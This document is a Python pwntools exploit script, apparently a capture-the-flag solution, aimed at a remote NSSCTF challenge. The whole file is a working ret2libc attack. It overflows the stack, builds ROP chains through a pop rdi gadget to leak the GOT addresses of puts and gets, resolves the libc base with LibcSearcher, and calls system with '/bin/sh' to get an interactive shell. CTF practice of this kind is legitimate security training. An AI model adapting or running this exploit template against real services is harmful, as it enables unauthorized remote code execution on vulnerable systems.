from pwn import *
from LibcSearcher import *
context(arch='amd64',os='linux',log_level='debug')
p=remote('node4.anna.nssctf.cn',27370)
elf=ELF('./pwn')

puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
gets_plt=elf.plt['gets']
gets_got=elf.got['gets']
ret_addr=0x0000000000400509
rdi_addr=0x0000000000400763
main_addr=0x4006D6

payload=flat([cyclic(16+8),rdi_addr,puts_got,puts_plt,main_addr])
p.sendline(payload)
leak_puts=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.info(hex(leak_puts))

payload=flat([cyclic(16+8),rdi_addr,gets_got,puts_plt,main_addr])
p.sendline(payload)
leak_gets=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

obj=LibcSearcher("puts",leak_puts)
obj.add_condition("gets",leak_gets)
log.success(f"Leak Puts: {hex(leak_puts)}")
libc_base=leak_puts-obj.dump("puts")
log.info(hex(libc_base))

sys_addr=libc_base+obj.dump("system")
sh_addr=libc_base+obj.dump("str_bin_sh")

payload=flat([cyclic(16+8),rdi_addr,sh_addr,sys_addr,0])
p.sendline(payload)
p.interactive()

